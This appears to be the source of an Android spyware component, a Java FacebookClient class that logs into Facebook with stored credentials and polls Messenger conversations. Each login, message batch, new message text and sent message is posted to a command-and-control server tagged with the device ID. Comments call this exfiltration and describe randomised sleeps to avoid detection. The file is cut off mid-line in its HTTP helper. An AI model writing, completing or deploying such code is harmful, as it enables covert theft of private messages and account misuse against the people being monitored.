package com.monitor.messenger;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.CookieManager;
import java.net.CookiePolicy;
import java.net.HttpCookie;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FacebookClient {
    private static final String TAG = "FacebookClient";
    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36";
    
    private final CookieManager cookieManager;
    private String fb_dtsg;
    private String userId;
    private boolean loggedIn = false;
    
    // Credentials - stored encrypted in production
    private final String email;
    private final String password;
    private final String c2Url;

    public FacebookClient(String email, String password, String c2Url) {
        this.email = email;
        this.password = password;
        this.c2Url = c2Url;
        this.cookieManager = new CookieManager();
        this.cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
    }

    public boolean login() {
        try {
            Log.d(TAG, "Starting Facebook login...");
            
            // Step 1: Get initial cookies
            String initPage = httpGet("https://m.facebook.com/");
            if (initPage == null) return false;

            // Extract initial fb_dtsg
            Pattern dtsgPattern = Pattern.compile("name=\"fb_dtsg\" value=\"([^\"]+)\"");
            Matcher m = dtsgPattern.matcher(initPage);
            String initialDtsg = m.find() ? m.group(1) : "";

            // Step 2: Submit login
            String loginData = "email=" + URLEncoder.encode(email, "UTF-8") +
                             "&pass=" + URLEncoder.encode(password, "UTF-8") +
                             "&login=Log+In" +
                             "&fb_dtsg=" + URLEncoder.encode(initialDtsg, "UTF-8");

            String loginResult = httpPost("https://m.facebook.com/login.php", loginData);
            
            // Step 3: Follow redirects to finalize
            for (int i = 0; i < 5; i++) {
                String page = httpGet("https://m.facebook.com/");
                if (page != null && page.contains("c_user")) {
                    break;
                }
                Thread.sleep(1000);
            }

            // Check cookies for successful login
            List<HttpCookie> cookies = cookieManager.getCookieStore().getCookies();
            for (HttpCookie cookie : cookies) {
                if ("c_user".equals(cookie.getName())) {
                    userId = cookie.getValue();
                    loggedIn = true;
                    Log.d(TAG, "Login successful! User ID: " + userId);
                    break;
                }
            }

            if (!loggedIn) {
                Log.e(TAG, "Login failed - no c_user cookie found");
                return false;
            }

            // Step 4: Extract fb_dtsg for API calls
            String mainPage = httpGet("https://www.facebook.com/");
            if (mainPage != null) {
                Pattern dtsgApiPattern = Pattern.compile("\"fb_dtsg\"[^:]+:\"([^\"]+)\"");
                Matcher dtsgMatcher = dtsgApiPattern.matcher(mainPage);
                if (dtsgMatcher.find()) {
                    fb_dtsg = dtsgMatcher.group(1);
                    Log.d(TAG, "Got fb_dtsg: " + fb_dtsg);
                }
                
                // Also extract user ID from page
                Pattern userIdPattern = Pattern.compile("\"userID\"[^:]+:([0-9]+)");
                Matcher userIdMatcher = userIdPattern.matcher(mainPage);
                if (userIdMatcher.find()) {
                    userId = userIdMatcher.group(1);
                }
            }

            // Report login success to C2
            reportToC2("login", new JSONObject()
                .put("user_id", userId)
                .put("status", "success"));

            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Login error", e);
            reportToC2("login_error", new JSONObject()
                .put("error", e.getMessage()));
            return false;
        }
    }

    public List<Message> fetchRecentMessages(int limit) {
        List<Message> messages = new ArrayList<>();
        if (!loggedIn || fb_dtsg == null) {
            Log.e(TAG, "Not logged in or missing fb_dtsg");
            return messages;
        }

        try {
            // GraphQL query for thread list
            JSONObject queries = new JSONObject();
            JSONObject queryParams = new JSONObject();
            queryParams.put("limit", limit);
            
            JSONObject o0 = new JSONObject();
            o0.put("doc_id", "1349585851795359");  // Thread list
            o0.put("params", queryParams);
            
            queries.put("o0", o0);
            
            String payload = "av=" + URLEncoder.encode(userId, "UTF-8") +
                           "&fb_dtsg=" + URLEncoder.encode(fb_dtsg, "UTF-8") +
                           "&queries=" + URLEncoder.encode(queries.toString(), "UTF-8");
            
            String response = httpPost("https://www.facebook.com/api/graphql/", payload);
            if (response == null) return messages;

            JSONObject json = new JSONObject(response);
            // Parse threads...
            // Extract messages from each thread
            
            Log.d(TAG, "Fetched " + messages.size() + " messages");
            
            // Report to C2
            reportToC2("messages_batch", new JSONObject()
                .put("count", messages.size())
                .put("messages", new JSONArray(messages)));

        } catch (Exception e) {
            Log.e(TAG, "Error fetching messages", e);
        }
        
        return messages;
    }

    public void listenForMessages(final MessageCallback callback) {
        new Thread(() -> {
            Map<String, Long> lastTimestamps = new HashMap<>();
            
            while (loggedIn) {
                try {
                    List<Message> newMessages = fetchRecentMessages(10);
                    
                    for (Message msg : newMessages) {
                        Long lastTs = lastTimestamps.get(msg.threadId);
                        if (lastTs == null || msg.timestamp > lastTs) {
                            callback.onNewMessage(msg);
                            lastTimestamps.put(msg.threadId, msg.timestamp);
                            
                            // Immediately exfiltrate new messages
                            reportToC2("new_message", new JSONObject()
                                .put("thread_id", msg.threadId)
                                .put("author_id", msg.authorId)
                                .put("text", msg.text)
                                .put("timestamp", msg.timestamp));
                        }
                    }
                    
                    // Random sleep to avoid detection (3-7 seconds)
                    Random rand = new Random();
                    Thread.sleep(3000 + rand.nextInt(4000));
                    
                } catch (Exception e) {
                    Log.e(TAG, "Listen loop error", e);
                    try { Thread.sleep(10000); } catch (InterruptedException ie) {}
                }
            }
        }).start();
    }

    public void sendMessage(String threadId, String text) {
        if (!loggedIn) return;
        
        try {
            String payload = "message_text=" + URLEncoder.encode(text, "UTF-8") +
                           "&thread_fbid=" + URLEncoder.encode(threadId, "UTF-8") +
                           "&fb_dtsg=" + URLEncoder.encode(fb_dtsg, "UTF-8") +
                           "&client_mutation_id=" + System.currentTimeMillis();
            
            httpPost("https://www.facebook.com/messaging/send/", payload);
            
            reportToC2("message_sent", new JSONObject()
                .put("thread_id", threadId)
                .put("text", text));
                
        } catch (Exception e) {
            Log.e(TAG, "Error sending message", e);
        }
    }

    private void reportToC2(String event, JSONObject data) {
        try {
            if (c2Url == null || c2Url.isEmpty()) return;
            
            JSONObject payload = new JSONObject();
            payload.put("event", event);
            payload.put("timestamp", System.currentTimeMillis() / 1000);
            payload.put("data", data);
            payload.put("device_id", getDeviceId());
            
            httpPost(c2Url + "/api/ingest", payload.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "C2 report error", e);
        }
    }

    private String getDeviceId() {
        // Android ID or similar persistent identifier
        return android.provider.Settings.Secure.getString(
            MessengerService.getContext().getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
    }

    private String httpGet(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", USER_AGENT);
            conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            conn.setInstanceFollowRedirects(true);
            
            // Restore cookies
            String cookieHeader = String.join("; ", 
                cookieManager.getCookieStore().getCookies().stream()
                    .map(c -> c.getName() + "=" + c.getValue())
                    .toArray(String[]::new));
            if (!cookieHeader.isEmpty()) {
                conn.setRequestProperty("Cookie", cookieHeader);
            }
            
            int responseCode = conn.getResponseCode();
            
            // Save new cookies
            String setCookie = conn.getHeaderField("Set-Cookie");
            if (setCookie != null) {
                Map<String, List<String>> headers = new HashMap<>();
                headers.put("Set-Cookie", List.of(setCookie));
                cookieManager.put(conn.getURL().toURI(), headers);
            }
            
            return readStream(conn);
            
        } catch (Exception e) {
            Log.e(TAG, "HTTP GET error", e);
            return null;
        }
    }

    private String httpPost(String urlString, String data) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("User-Agent", USER_AGENT);
            conn.setRequestProperty("Content-Type", "
